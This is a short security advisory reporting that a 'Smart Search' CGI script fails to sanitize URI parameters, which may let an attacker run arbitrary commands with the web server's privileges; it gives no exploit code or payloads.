A vulnerability has been discovered in the Smart Search CGI script. Due to insufficient sanitization of user-supplied URI parameters, it may be possible for an attacker to execute arbitrary commands on a target system. All commands executed in this manner would be run with the privileges of the web server hosting the script.
